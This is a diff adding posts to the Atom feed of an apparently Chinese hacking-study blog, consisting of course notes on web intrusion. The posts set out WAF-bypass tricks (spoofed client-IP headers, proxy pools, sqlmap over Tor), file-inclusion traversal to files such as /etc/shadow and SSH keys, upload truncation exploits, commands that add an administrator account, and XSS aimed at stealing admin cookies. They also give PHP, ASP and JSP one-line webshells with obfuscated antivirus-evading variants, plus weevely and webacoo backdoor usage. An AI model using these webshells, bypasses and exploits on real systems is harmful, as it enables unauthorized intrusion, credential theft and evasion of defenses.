@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://itxz.fun</id>
     <title>pony686</title>
-    <updated>2020-09-08T13:25:46.470Z</updated>
+    <updated>2020-10-04T02:04:28.916Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://itxz.fun"/>
     <link rel="self" href="https://itxz.fun/atom.xml"/>
@@ -10,6 +10,941 @@
     <logo>https://itxz.fun/images/avatar.png</logo>
     <icon>https://itxz.fun/favicon.ico</icon>
     <rights>All rights reserved 2020, pony686</rights>
+    <entry>
+        <title type="html"><![CDATA[25  waf 绕过的讲解]]></title>
+        <id>https://itxz.fun/post/25-waf-rao-guo-de-jiang-jie/</id>
+        <link href="https://itxz.fun/post/25-waf-rao-guo-de-jiang-jie/">
+        </link>
+        <updated>2020-10-03T23:06:21.000Z</updated>
+        <content type="html"><![CDATA[<p>网站的防护：<br>
+1.源码自带的防护代码  （ 注入，上传，xss，等存在拦截）<br>
+2.软件WAF   （ 各种web漏洞 提权组件  owasp top 10  ，访问速度，指纹拦截）<br>
+sqlmap 识别了你的指纹  sqlmap 。org 注入语句即使过waf 也会拦截<br>
+安全狗/D盾/云锁/云盾/360 等waf</p>
+<p>安全狗   （你执行的注入语句 检测出来拦截，不会封锁你ip，<br>
+认为你是cc攻击 （目录扫描速度过快，sqlmap跑注入 速度过快 会认为你是在cc攻击）<br>
+10/100   ip封锁五分钟<br>
+3.硬件WAF<br>
+硬件 主要防御流量和一些web攻击<br>
+注入 天融信    防火墙会封锁ip<br>
+阿里云 硬件waf （不光拦截web漏洞攻击，速度过快 ddos 拦截）<br>
+1个小时 封锁ip<br>
+是通过http请求 还是通过tcp 的ip来封锁的<br>
+如果是通过http请求头来获取ip封锁的，那么<br>
+client-ip: 1.1.1.1<br>
+x-forward-for:  1.1.1.1</p>
+<p>如果是基于tcp获取ip封锁的情况下躲避拦截：<br>
+用代理（换ip来访问)<br>
+我们可以使用代理池（几十万的ip，验证完，吧这些ip到处来）</p>
+<p>4.云WAF</p>
+<p>waf<br>
+web appcation  firewall</p>
+<p>1.一定注意软件的 指纹信息清理或者修改</p>
+<p>waf 拦截两个方向：<br>
+1.基于ip封锁（cc攻击 ddos等态势感知）<br>
+2.基于web应用攻击（web漏洞攻击拦截，指纹）</p>
+<p>通用型防护代码：<br>
+1.注入 上传xss</p>
+<ol>
+<li>大小写替换<br>
+2.变换提交方式（get/post/cookie）<br>
+3.编码绕过（url编码，基于语句重叠，注释符号等等）</li>
+</ol>
+<p>d盾<br>
+注入   上传   webshell  菜刀</p>
+<p>ngx_lua_waf</p>
+<p>wts -WAF</p>
+<p>iis7.0</p>
+<p>目录扫描：<br>
+指纹<br>
+速度<br>
+ip封锁</p>
+<p>搞个代理池 十万个代理ip 验证<br>
+8w ip</p>
+<p>sqlmap  --proxy-file=c:\1.txt</p>
+<p>timeout 30<br>
+飘红一次<br>
+三次</p>
+<p>90s</p>
+<p>依然会很慢</p>
+<p>阿里云<br>
+sqlmap --tor  --proxy-type=socks5</p>
+<p>配合kali来用tor代理</p>
+<p>admin/<br>
+403<br>
+501<br>
+500<br>
+401</p>
+<p>xss</p>
+<p>你要探测它是否是通过tcp ip限制<br>
+remote-ip<br>
+还是 http</p>
+<p>X-Forwarded-For:159.97.29.246<br>
+X-Forwarded-Host:159.97.29.246<br>
+X-Client-IP:159.97.29.246<br>
+X-remote-IP:159.97.29.246<br>
+X-remote-addr:159.97.29.246<br>
+True-Client-IP:159.97.29.246<br>
+X-Client-IP:159.97.29.246<br>
+Client-IP:159.97.29.246<br>
+X-Real-IP:159.97.29.246</p>
+<p>xss  写管理员登录的ip</p>
+<p>xss 打过来之后 管理员的ip  如果是外网浙江220.18.4.10<br>
+s5  911.re   全世界各地ip段都有<br>
+可以找一些这个段的ip</p>
+<p>3389 怎么突破  3389 访问这个ip220.18.4.10<br>
+可以使用端口转发<br>
+lcx  转发到vps  链接vps的端口就可以了<br>
+msf  建立链接之后 portfwd add  端口转发</p>
+<p>方法：<br>
+1大小写变种<br>
+2使用SQL注释<br>
+3使用URL编码<br>
+4使用空字节<br>
+5使用嵌套过剥离<br>
+6使用非标准入口点<br>
+7避开自定义过滤器</p>
+<p>1.url参数污染<br>
+（1.可以用注释和空字符和内联注释来进行污染）<br>
+access  asp<br>
+%0a %od %09 %20<br>
+%%%%%0a  代替空格可以够宝塔  WTS<br>
++号也可以代替空格  可以过360</p>
+<p>--</p>
+<h1 id=""></h1>
+<p>%23<br>
+/**/<br>
+/<em>!50001</em>/<br>
+加载字典跑</p>
+<p>（2.可以使用长度来进行污染）可以使用垃圾字符 增加提交内容长度<br>
+waf 拦截长度是有一定的限制</p>
+<p>长度污染 （一般用是post提交的时候，上传的时候）</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[22 权限提升讲解]]></title>
+        <id>https://itxz.fun/post/22-quan-xian-ti-sheng-jiang-jie/</id>
+        <link href="https://itxz.fun/post/22-quan-xian-ti-sheng-jiang-jie/">
+        </link>
+        <updated>2020-09-30T12:56:06.000Z</updated>
+        <content type="html"><![CDATA[<p>各种漏洞拿到shell<br>
+获取webshell权限，可以对网站任意修改<br>
+获取服务的管理员权限（系统权限）<br>
+1.网络服务用户权限<br>
+2.webshell（对网站修改）<br>
+3.(系统权限)（管理权限 system rootquan）</p>
+<p>提权 提升权限</p>
+<p>ASP/php 匿名权限</p>
+<p>ASPx USER权限</p>
+<p>jsp 通常是系统权限</p>
+<p>注意： 在脚本允许的情况下可以变换脚本提权</p>
+<p>收集信息<br>
+内外网<br>
+服务器系统和版本 位数<br>
+服务器的补丁情况<br>
+服务器的安装软件情况<br>
+服务器的防护软件情况<br>
+端口情况<br>
+支持脚本情况<br>
+...........<br>
+信息收集常用命令<br>
+windows：<br>
+ipconfig /all 查看当前ip<br>
+net user 查看当前服务器账号情况<br>
+netstat -ano 查看当前服务器端口开放情况<br>
+ver 查看当前服务器操作系统<br>
+systeminfo 查看当前服务器配置信息（补丁情况）<br>
+tasklist /svc 查看当前服务器进程情况<br>
+taskkill -PID pid号 结束某个pid号的进程<br>
+taskkill /im qq.exe /f  结束qq进程<br>
+net user cracer cracer /add 添加一个用户名为cracer密码为cracer的用户<br>
+net localgroup administrators cracer /add 将用户cracer添加到管理员组<br>
+whoami 查看当前操作用户（当前权限）<br>
+linux：</p>
+<p>ls -al 查看当前目录下的文件和文件夹</p>
+<p>pwd 查看当前操作路径</p>
+<p>uname -a 查看当前服务器内核信息</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[18php 常见的漏洞]]></title>
+        <id>https://itxz.fun/post/18php-chang-jian-de-lou-dong/</id>
+        <link href="https://itxz.fun/post/18php-chang-jian-de-lou-dong/">
+        </link>
+        <updated>2020-09-25T09:40:35.000Z</updated>
+        <content type="html"><![CDATA[<p>01 文件包含漏洞<br>
+文件包含<br>
+程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，<br>
+而无需再次编写，这中文件调用的过程一般被称为文件包含。<br>
+程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，<br>
+但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。<br>
+几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多,<br>
+而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。<br>
+在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。<br>
+常见文件包含函数<br>
+include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行<br>
+require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本<br>
+include_once()和require_once()：若文件中代码已被包含则不会再次包含<br>
+程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件<br>
+用户能够控制该动态变量</p>
+<p>漏洞危害<br>
+执行任意代码<br>
+包含恶意文件控制网站<br>
+甚至控制服务器</p>
+<p>漏洞分类<br>
+本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码<br>
+上传图片马，然后包含<br>
+读敏感文件，读PHP文件<br>
+包含日志文件GetShell<br>
+包含/proc/self/envion文件GetShell<br>
+包含data:或php://input等伪协议<br>
+若有phpinfo则可以包含临时文件<br>
+远程文件包含：可以直接执行任意代码<br>
+要保证php.ini中allow_url_fopen和allow_url_include要为On</p>
+<p>漏洞挖掘<br>
+通过白盒代码审计<br>
+黑盒工具挖掘<br>
+awvs appscan burp<br>
+w3af</p>
+<p>本地包含漏洞<br>
+文件包含漏洞利用的条件<br>
+1 include()等函数通过动态变量的方式引入需要包含的文件<br>
+2 用户能控制该动态变量</p>
+<?php 
+$test=$_GET['c'];
+include($test);
+?>
+<p>保存为 include.php<br>
+在同一个目录下创建test.txt 内容为</p>
+<?php phpinfo() ?>
+<p>访问测试  //http://127.0.0.1/test/include.php?c=test.txt    //访问连接，将123.txt传送给c并赋给test变量</p>
+<p>本地包含漏洞注意事项<br>
+相对路径<br>
+../../../etc/passwd<br>
+%00截断包含(PHP&lt;5.3.4)</p>
+<?php
+      include $_GET[x].'.php';
+	  echo $_GET[x].'.php';
+?>
+<p>magic_quotes_gps=off 才可以，否则%00会被转义</p>
+<p>截断绕过<br>
+?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.<br>
+(php版本小于5.2.8(?)可以成功<br>
+?file=../../../../../../../../../boot.ini/………[…]…………<br>
+(php版本小于5.2.8(?)可以成功，只适用windows<br>
+其他绕过<br>
+dvwa中级难度的包含，这个主要是过滤了远程文件包含和我们目录的跳转，大小写混合输入就可以绕过远程文件包含的过滤<br>
+目录跳转的过滤我们可以构造….//….//xxx.php，方式绕过，由于他只过滤一次，我们可以利用他的过滤动态拼接目录跳转，从而绕过过滤</p>
+<p>利用技巧<br>
+上传图片马，马包含的代码为<?fputs(fopen("shell.php","w"),"<?php eval($_POST[x]);?>&quot;)?&gt;，<br>
+上传后图片路径为/uploadfile/x.jpg，当访问<br>
+http://www.cracer.com/xx.php?page=uploadfile/x.jpg时，<br>
+将会在fi这个文件夹下生成shell.php,内容为<?php eval($_POST[x); ?></p>
+<p>读敏感文件<br>
+Windows：<br>
+C:\boot.ini  //查看系统版本<br>
+C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件<br>
+C:\Windows\repair\sam  //存储系统初次安装的密码<br>
+C:\Program Files\mysql\my.ini  //Mysql配置<br>
+C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root<br>
+C:\Windows\php.ini  //php配置信息<br>
+C:\Windows\my.ini  //Mysql配置信息<br>
+Linux：<br>
+/root/.ssh/authorized_keys<br>
+/root/.ssh/id_rsa<br>
+/root/.ssh/id_ras.keystore<br>
+/root/.ssh/known_hosts<br>
+/etc/passwd<br>
+/etc/shadow<br>
+/etc/my.cnf<br>
+/etc/httpd/conf/httpd.conf<br>
+/root/.bash_history<br>
+/root/.mysql_history<br>
+/proc/self/fd/fd[0-9]*(文件标识符)<br>
+/proc/mounts<br>
+/porc/config.gz<br>
+包含日志(主要是得到日志的路径)<br>
+读日志路径：<br>
+文件包含漏洞读取apache配置文件<br>
+index.php?page=/etc/init.d/httpd<br>
+index.php?page=/etc/httpd/conf/httpd.conf<br>
+默认位置/var/log/httpd/access_log</p>
+<p>包含日志(主要是得到日志的路径)<br>
+日志会记录客户端请求及服务器响应的信息，访问http://www.xx.com/<?php phpinfo(); ?>时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent<br>
+可以通过Burp Suite来绕过编码</p>
+<p>文件包含漏洞实例<br>
+制作错误，写入一句话<br>
+http://127.0.0.1/ekucms/index.php?s=my/show/id/{~eval($_POST[x])}</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[xss漏洞]]></title>
+        <id>https://itxz.fun/post/xss-lou-dong/</id>
+        <link href="https://itxz.fun/post/xss-lou-dong/">
+        </link>
+        <updated>2020-09-16T14:11:35.000Z</updated>
+        <content type="html"><![CDATA[<p>XSS（cross-site script）跨站脚本自1996年诞生以来，一直被OWASP(open web application security project) 评为十大安全漏洞中的第二威胁漏洞。也有黑客把xss当做新型的“缓冲区溢出攻击”，而JavaScript是新型的shellcode。<br>
+2011年6月份，国内最火的信息发布平台“新浪微博”爆发了xss蠕虫攻击，仅持续16分钟，感染用户近33000个，危害十分严重。<br>
+xss最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的。</p>
+<p>什么是跨站脚本？<br>
+是一种经常出现在web应用程序中的计算机安全漏洞，是由于web应用程序对用户的输入过滤不严而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗等攻击手段。<br>
+跨站脚本实例</p>
+<html>
+<head>xss test</head>
+<body>
+<script>alert("xss")</script>
+</body>
+</html>
+这段代码使用alert函数来执行打开一个消息框，消息框中显示xss信息
+使用xss弹出恶意警告框，代码为：
+<script>alert("xss")</script>
+xss输入也可能是html代码段，如果使网页不停的刷新，代码为
+<meta http-equiv="refresh" content="0;">
+嵌入其他网站链接的代码为：
+<iframe src=http://cracer.com width=0 height=0></iframe>
+<p>网络钓鱼，包括盗取各类的用户账号<br>
+窃取用户cookie<br>
+窃取用户浏览请回话<br>
+强制弹出广告页面、刷流量<br>
+网页挂马<br>
+提升用户权限，进一步渗透网站<br>
+传播跨站脚本蠕虫等</p>
+<p>Xss分类<br>
+反射型XSS<br>
+DOM型xss<br>
+存储型XSS</p>
+<p>反射型跨站脚本也称作非持久型、参数型跨站脚本、这类型的脚本是最常见的 ，也是使用最为广泛的一种，主要用于将恶意的脚本附加到URL地址的参数中<br>
+例如<br>
+http://www.cracer.com/search.php?key=&quot;&gt;<script>alert(&quot;xss&quot;)</script><br>
+一般使用的将构造好的URL发给受害者，是受害者点击触发，而且只执行一次，非持久化。</p>
+<p>存在xss漏洞<br>
+bc<br>
+qp<br>
+zjp<br>
+测管理员经常上线的站点<br>
+借助社工 让管理员登陆后台触发漏洞<br>
+cookie 盗取   欺骗管理份登陆后台<br>
+黑帽seo js代码</p>
+<p>快照劫持 页面跳转 蜘蛛劫持 钓鱼 等一系列攻击<br>
+根目录/首页 head 头标签里面的script代码<br>
+global.ass<br>
+self.xss</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[16编辑器漏洞]]></title>
+        <id>https://itxz.fun/post/16-bian-ji-qi-lou-dong/</id>
+        <link href="https://itxz.fun/post/16-bian-ji-qi-lou-dong/">
+        </link>
+        <updated>2020-09-14T09:59:15.000Z</updated>
+        <content type="html"><![CDATA[<p>编辑器配合解析漏洞利用<br>
+编辑器自身的漏洞利用‘</p>
+<p>wordpress<br>
+emlog<br>
+zblog<br>
+dz<br>
+dedecms +eweb/fck/kindeditor/ueditor<br>
+源码本身没有漏洞，编辑器可能存在漏洞<br>
+挖掘编辑器  漏洞</p>
+<p>1.确定编辑器<br>
+网站可能存在多个编辑器<br>
+0ld/<br>
+bbs/<br>
+端口搭建的站点 经常存在编辑器漏洞<br>
+可能会存在二级目录下<br>
+admin/ewebditor<br>
+editor<br>
+edit<br>
+admin_editor<br>
+在这些目录访问ewebeditor.asp/htm/html<br>
+ewebeditor/kindeditor</p>
+<p>fckeditor<br>
+一般放在根目录<br>
+有可能也放在admin目录下<br>
+include目录下 ecshop cms<br>
+隐藏站点：存在编辑器漏洞<br>
+子站：目录站/ip端口站：<br>
+www.baidu.com</p>
+<p>fck ckeditor<br>
+针对于版本漏洞利用<br>
+fck&lt;2.6.4<br>
+fck配合解析漏洞利用<br>
+看网站容器有没有利用的解析漏洞</p>
+<p>2，找编辑器版本对应的漏洞<br>
+3。漏洞利用</p>
+<p>x.asp%00.jpg<br>
+2.4<br>
+1.配合解析漏洞<br>
+2.利用截断getshell<br>
+2.5利用解析漏洞 递推创建a。asp/1.a's'p<br>
+利用00截断getshell<br>
+尝试两种截断<br>
+a.asp%00.jpg<br>
+a.asp%00.jpg<br>
+如果碰到阿里云<br>
+上传后的文件名改成 a_asp 还会封你ip<br>
+解决办法<br>
+换ip上传<br>
+截短连发三个包<br>
+1.a_asp<br>
+2a（1）—asp<br>
+3.a（1）.asp</p>
+<p>2.6.4 以上的重命名 2020</p>
+<p>eweb编辑器</p>
+<p>PART 1:  编辑器路径查找<br>
+查找编辑器目录	<br>
+目录扫描<br>
+目录遍历<br>
+蜘蛛爬行<br>
+注意事项：<br>
+查找路径时应注意站中站和子站的编辑器路径<br>
+如果进入后台查找编辑器未能正常显示的，可以利用审查元素搜索editor等关键字、或者<br>
+换低版本浏览器打开查看编辑器<br>
+漏洞利用<br>
+百度相关编辑器漏洞利用<br>
+查看编辑器版本-根据版本查找对应漏洞利用方法-漏洞利用<br>
+平时注意收集各种编辑器漏洞利用方法</p>
+<p>PART 2:  FCK编辑器漏洞<br>
+FCKeditor编辑器页/查看编辑器版本/查看文件上传路径<br>
+FCKeditor编辑器页 <br>
+FCKeditor/_samples/default.html <br>
+查看编辑器版本 <br>
+FCKeditor/_whatsnew.html <br>
+查看文件上传路径<br>
+fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[文件上传漏洞]]></title>
+        <id>https://itxz.fun/post/wen-jian-shang-chuan-lou-dong/</id>
+        <link href="https://itxz.fun/post/wen-jian-shang-chuan-lou-dong/">
+        </link>
+        <updated>2020-09-13T14:00:05.000Z</updated>
+        <content type="html"><![CDATA[<p>我们讲的上传是上传脚本<br>
+iis5.6.0 容器:<br>
+1.目录解析漏洞 /a.asp/x.jpg<br>
+2.分号解析漏洞：uploadfiles/x.asax x.asax  也能识别aps文件<br>
+iis7./7.5/8.x/10.x 　服务器０８　２０１２　２０１６<br>
+如果开启了ｆａｓｔ－ｃｇｉ模板<br>
+ｕｐｌｏａｄｆｉｌｅｓ／ｘ．ｊｐｇ<br>
+ｕｐｌｏａｄｆｉｌｅｓ／ｘ．ｊｐｇ／．ａｓｐ　配合ｆｃｋ编辑器使用<br>
+ｘ．ｐｈｐ％００．ｊｐｇ　ＩＩＳ７．ｘ　０８　ｎｇｉｎｘ版本固定漏洞<br>
+ａｐａｃｈｅ：<br>
+ｘ．ｐｈｐ．ｚｚｚ　配合黑名单利用<br>
+ｘ．ｐｈｐ．<br>
+ｘ．ｐｈｐ．ｊｐｇ　也能解析成ｐｈｐ脚本<br>
+ｘ．ｐｈｐ．ｊｐｇ？ｓｉｄ＝１２３　这种居多</p>
+<p>%00  截断<br>
+::$data 截断php文件<br>
+cracer.com/upoloadfiles/x.asp/20200510123123.jpg</p>
+<p>03+iis.6<br>
+08+ii7.0/7.5<br>
+2012 iis8.0<br>
+2016 iis10.x</p>
+<p>php.3 可以解析<br>
+phtml<br>
+iis10.0<br>
+x.jpg</p>
+<p>文件上传后发生改变<br>
+时间戳命名居多<br>
++白名单来限制上传<br>
+asp  无明显</p>
+<ol>
+<li>
+<p>通过前台图片分析上传路径</p>
+</li>
+<li>
+<p>爆破工具进行爆破文件名称</p>
+<p>metinfo<br>
+uploadfile/20123123.jpg/.php<br>
+awvs扫描到了一个上传接口 上传简历 招聘地方<br>
+上传成功没回显示<br>
+1.下载metinfocms 本地复现<br>
+2,分析文件名命名规则<br>
+3.burp抓包爆破[,]获取图片地址</p>
+</li>
+</ol>
+<p>crcaer.com/uploadfiles/20200510123123.jpg</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[脚本木马工作的原理]]></title>
+        <id>https://itxz.fun/post/jiao-ben-mu-ma-gong-zuo-de-yuan-li/</id>
+        <link href="https://itxz.fun/post/jiao-ben-mu-ma-gong-zuo-de-yuan-li/">
+        </link>
+        <updated>2020-09-13T01:37:20.000Z</updated>
+        <content type="html"><![CDATA[<p>xx.com /dama.asp</p>
+<p>只是对网站有权限修改<br>
+iis网络服务用户</p>
+<p>webshell取决于容器间运行的权限 IIS 网络用户<br>
+apache apache用户<br>
+提权 system</p>
+<p>免杀问题</p>
+<p>safedog<br>
+d盾<br>
+云锁<br>
+360<br>
+阿里云防护<br>
+bypass<br>
+免杀<br>
+www.cracer.com/x.txt<br>
+a.php<br>
+&lt;% execute request(&quot;valuer&quot;)%&gt;</p>
+<p>x.asp<br>
+x.php<br>
+x.jpg</p>
+<p>webshell的种类<br>
+一句话木马<br>
+小马<br>
+大马<br>
+打包马<br>
+脱裤马<br>
+等等<br>
+PART 2:  WEBSHELL 工作原理</p>
+<p>介绍：<br>
+一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。</p>
+<p>&lt;%execute request(&quot;value&quot;)%&gt;<br>
+x.asp</p>
+<p>iis容器（asp/aspx/php）<br>
+cracer.com/x.php<br>
+如容器支持其他脚本类型，可以上传其他脚本木马<br>
+apache/nginx<br>
+php<br>
+asp</p>
+<p>asp/aspx</p>
+<p>iis容器 asp 脚本权限和aspx脚本权限一样吗<br>
+aspx高一些<br>
+调用cms aspx 马可以调用系统cmd<br>
+jsp/tomcat/jboss weblogic administrator system root<br>
+直接提权<br>
+存在降权 public 网络服务用户</p>
+<p>多级包含<br>
+a.asp  b.asp</p>
+<p>工作原理<br>
+黑客在注册信息的电子邮箱或者个人主页等中插入类似如下代码：<br>
+&lt;%execute request(&quot;value&quot;)%&gt;<br>
+其中value是值，所以你可以更改自己的值，前面的request就是获取这个值<br>
+&lt;%eval request(&quot;value&quot;)%&gt;(现在比较多见的，而且字符少，对表单字数有限制的地方特别的实用)<br>
+当知道了数据库的URL，就可以利用本地一张网页进行连接得到Webshell。（不知道数据库也可以，只要知道&lt;%eval request(&quot;value&quot;)%&gt;这个文件被插入到哪一个ASP文件里面就可以了。）<br>
+这就被称为一句话木马，它是基于B/S结构的。</p>
+<p>常见写法<br>
+asp一句话木马：<br>
+&lt;%eval request(&quot;c&quot;)%&gt;<br>
+php一句话木马：</p>
+<?php @eval($_POST[value]);?>
+<p>aspx一句话木马：<br>
+&lt;%@ Page Language=&quot;Jscript&quot;%&gt;<br>
+&lt;%eval(Request.Item[&quot;value&quot;])%&gt;<br>
+jsp一句话<br>
+&lt;%if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt;<br>
+一句话的使用<br>
+首先,找到数据库是asp格式的网站,然后,以留言板,或者发表文章的方式,把一句话添加到asp数据库，或者加进asp网页.<br>
+记住!我们的目的是把一句话&lt;%execute request(&quot;value&quot;)%&gt;添加到数据库,无论任何方式!<br>
+然后打开客户端(就是你电脑上面的那个htm文件),填上加入了一句话的asp文件,或者是asp网页,然后进入此网站服务器。</p>
+<p>小马<br>
+小马体积小，容易隐藏，隐蔽性强，最重要在于与图片结合一起上传之后可以利用nginx或者IIS6的解析漏洞来运行，不过功能少，一般只有上传等功能。<br>
+主要用来上传大马</p>
+<p>大马<br>
+大马体积比较大  一般50K以上。功能也多，一般都包括提权命令，磁盘管理，数据库连接借口，执行命令甚至有些以具备自带提权功能和压缩，解压缩网站程序的功能。这种马隐蔽性不好，而大多代码如不加密的话很多杀毒厂商开始追杀此类程序<br>
+大马的使用<br>
+用途：<br>
+提权<br>
+打包<br>
+脱裤<br>
+增删文件<br>
+等等<br>
+PART 3:  一句话常见的客户端<br>
+一句话最常用的客户端为：<br>
+一句话客户端增强版<br>
+中国菜刀<br>
+中国砍刀<br>
+lanker一句话客户端<br>
+ZV新型PHP一句话木马客户端GUI版<br>
+webacoo<br>
+weveely<br>
+msf 生成的aspx、asp、php、jsp、各种payload<br>
+WeBaCoo (Web Backdoor Cookie) script-kit是一个小巧的、隐蔽的php后门，它提供了一个可以连接远程web服务器并执行php代码的终端。WeBaCoo使用HTTP响应头传送命令结果，shell命令经base64编码后隐藏在Cookie头中。</p>
+<p>生成模式<br>
+-h  查看帮助<br>
+-g   生成shell文件<br>
+终端模式<br>
+启动<br>
+webacoo -h  查看帮助<br>
+生成后门</p>
+<p>生成后门<br>
+webacoo -g -o test.php<br>
+连接<br>
+webacoo -t -u http://127.0.0.1/test.php<br>
+load  加载组建<br>
+unload 退出<br>
+Whoami 执行系统命令<br>
+Exit  退出<br>
+通过代理访问<br>
+webacoo -t -p 127.0.0.1:8080 –uhttp://127.0.0.1/test.php</p>
+<p>weevely<br>
+高隐蔽性的针对php平台的webshell工具<br>
+本身提供了30多种自动化扫描工具<br>
+可以执行多种任务<br>
+浏览文件系统，检测服务器设置，创建tcpshell和reverse shell,在<br>
+被测主机上安装http代理，执行端口扫描</p>
+<p>用法<br>
+weevely  --help<br>
+生成shell<br>
+weevely generate 123123 shell.php<br>
+连接 shell<br>
+weevelly  htpp://127.0.0.1/shell.php  123123<br>
+net.scan 127.0.0.1 20,22,23,8080,3389    扫描指定ip端口</p>
+<p>PART 4:  WEBSHELL 免杀技巧<br>
+使用技巧<br>
+内容编码<br>
+制作图片马<br>
+配合解析漏洞<br>
+配合文件包含</p>
+<p>内容编码</p>
+<?php $_REQUEST['a']($_REQUEST['b']); ?>
+<p>&lt;%Eval(Request(chr(112)))%&gt;<br>
+&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;xindong&quot;))%&gt;<br>
+&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;5&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;<br>
+&lt;%a=request(&quot;gold&quot;)%&gt;&lt;%eval a%&gt;</p>
+<?php ($_=@$_GET[2]).@$_($_POST[sz])?>
+<?php $a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["sz"]); ?>
+<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['sz']);?>
+<?php $a = "a"."s"."s"."e"."r"."t";  $a($_POST["sz"]); ?>
+<p>在菜刀里写http://localhost:8081/test/a.php?2=assert密码是sz</p>
+<p>404隐藏后门</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[sqlmap工具的使用]]></title>
+        <id>https://itxz.fun/post/sqlmap-gong-ju-de-shi-yong/</id>
+        <link href="https://itxz.fun/post/sqlmap-gong-ju-de-shi-yong/">
+        </link>
+        <updated>2020-09-12T13:32:39.000Z</updated>
+        <content type="html"><![CDATA[<p>SQLMAP介绍<br>
+sqlmap 是一个由Python语言编写的开源渗透测试工具，它主要用来检测sql注入漏洞，是一款功能强大的sql漏洞检测利用工具。</p>
+<p>它可以检测的数据库有：access、mssql、mysql、oracle、postgresql、db2、sqlite等<br>
+可以进行 sql盲注、union查询、显错注入、延迟注入、post注入、cookie注入等<br>
+其他功能:<br>
+执行命令、列举用户、检测权限、自动破解、数据导出等功能。</p>
+<p>sqlmap的安装<br>
+下载地址：<br>
+http://www.sqlmap.org<br>
+安装<br>
+首先需要安装python2.7 环境</p>
+<p>直接解压即可<br>
+更新<br>
+sqlmap.py --update</p>
+<p>基本参数<br>
+Sqlmap.py  -h 查看帮助选项<br>
+is-dba			当前用户权限<br>
+dbs				所有数据库<br>
+current-db			网站当前数据库<br>
+users			所有数据库用户<br>
+current-user		当前数据库用户<br>
+tables			参数:列表名<br>
+columns			参数:列字段<br>
+dump			参数:下载数据</p>
+<p>--dump 			获取表中的数据，包含列<br>
+--dump-all			转存DBMS数据库所有表项目<br>
+--level			测试等级(1-5)，默认为1<br>
+读取数据库---&gt;读取表----&gt;读取表的列----&gt;获取内容</p>
+<p>-D  			指定数据库<br>
+-T			指定表<br>
+-C			指定列<br>
+--dbms=mysql  oracle mssql     	指定数据库</p>
+<p>--users	枚举所有用户<br>
+--passwords	枚举所有用户密码<br>
+--roles	列出数据库管理员角色<br>
+--privileges 	列出数据库管理员权限</p>
+<p>列举数据库系统的架构<br>
+sqlmap.py -u &quot;http://xx.com/int.php?id=1&quot; --schema --batch --exclude-sysdbs</p>
+<p>参数：--level</p>
+<p>共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。<br>
+这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。<br>
+总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p>
+<p>-v  显示调试信息 有7个级别</p>
+<p>0、只显示python错误以及严重的信息。<br>
+1、同时显示基本信息和警告信息。（默认）<br>
+2、同时显示debug信息。<br>
+3、同时显示注入的payload。<br>
+4、同时显示HTTP请求。<br>
+5、同时显示HTTP响应头。<br>
+6、同时显示HTTP响应页面。</p>
+<p>风险等级<br>
+参数：--risk</p>
+<p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p>
+<p>在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p>
+<p>测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。</p>
+<p>获取目标<br>
+参数：-u或者--url<br>
+格式：http(s)😕/targeturl[:port]/[…]<br>
